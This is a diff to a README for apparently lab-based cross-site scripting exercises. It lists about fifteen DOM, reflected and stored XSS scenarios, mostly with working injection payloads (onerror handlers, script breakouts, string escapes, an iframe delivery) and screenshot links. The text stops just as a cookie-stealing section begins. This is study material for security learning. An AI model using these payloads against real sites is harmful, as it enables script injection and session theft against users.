@@ -32,52 +32,53 @@ Cross-site scripting (XSS) is a vulnerability that enables attackers to inject m
 ## 🔍 Example Scenarios
 
 ### 1.	DOM XSS in document.write sink using source location.search
-­	 ![DOM XSS]('screenshot/1.DOM XSS in document.write sink using source location.search.png')
+­	 ![ss](ss/1.png)
 -­	document.write() writes raw HTML into the page.
 ­-      "><svg src=x onload=alert(1)>
 ### 2.	DOM XSS in document.write sink using source location.search inside a select element
-­	 
+­	 ­	 ![ss](ss/2.png)
 -     ­	"></select><img%20src=1%20onerror=alert(1)>
 ### 3.	DOM XSS in innerHTML sink using source location.search
-­	
+­	![ss](ss/3.png)
 ­	-      javascript:alert(1) 
 - ­	Here query is directly injects it into the DOM using .innerHTML
 -     ­	<img src=1 onerror=alert(1)>
 ### 4.	DOM XSS in jQuery anchor href attribute sink using location.search source
-­	 
+­	 ![ss](ss/4.png)
 -     ­	https://academy.net/feedback?returnPath=javascript:alert(1)
 ### 5.	DOM XSS in jQuery selector sink using a hashchange event
-­	 
+­	 ![ss](ss/5.png)
 - ­	This code listens to the URL hash fragment (everything after #).
 - ­	It extracts that hash and injects it directly into a jQuery selector using :contains(...).
 - ­	If an attacker can control the hash, they can break out of the selector string and inject arbitrary code.
 -     ­	<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>             -- deliever from another server or html 
 ### 6.	Reflected DOM XSS
-­	 
+­	 ![ss](ss/6.png)
 - ­	This line parses the server’s JSON response using eval(), which allows attackers to execute arbitrary JavaScript code if they control or tamper with the response.
 -     ­	\"-alert(1)}//
 ### 7.	Stored DOM XSS
-­	 
+­	 ![ss](ss/7.png)
 -     ­	<><img src=1 onerror=alert(1)>
 ### 8.	Reflected XSS into attribute with angle brackets HTML-encoded
-­	 
+­	 ![ss](ss/8.png)
 -     ­	"onmouseover="alert(1)
 ### 9.	Stored XSS into anchor href attribute with double quotes HTML-encoded
-­	 
+­	 ![ss](ss/9.png)
+-     "onmouseover="alert(1)
 ### 10.	Reflected XSS into a JavaScript string with single quote and backslash escaped
-­	 
+­	 ![ss](ss/10.png)
 -     ­	</script><script>alert(1)</script>
 ### 11.	Reflected XSS into a JavaScript string with angle brackets HTML encoded
-­	 
+­	 ![ss](ss/11.png)
 -     ­	'-alert(1)-'
 ### 12.	Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
-­	 
+­	 ![ss](ss/12.png)
 -     ­	\'-alert(1)//
 ### 13.	Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
-­	 
+­	 ![ss](ss/13.png)
 -     ­	http://aa.com/?%27-alert(1)-%27 or http://aa.com/?&apos;-alert(1)-&apos;  
 ### 14.	Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
-­	 
+­	 ![ss](ss/14.png)
 -     ­	${alert(1)}
 ### 15.	Exploiting cross-site scripting to steal cookies
 -     ­	<script>
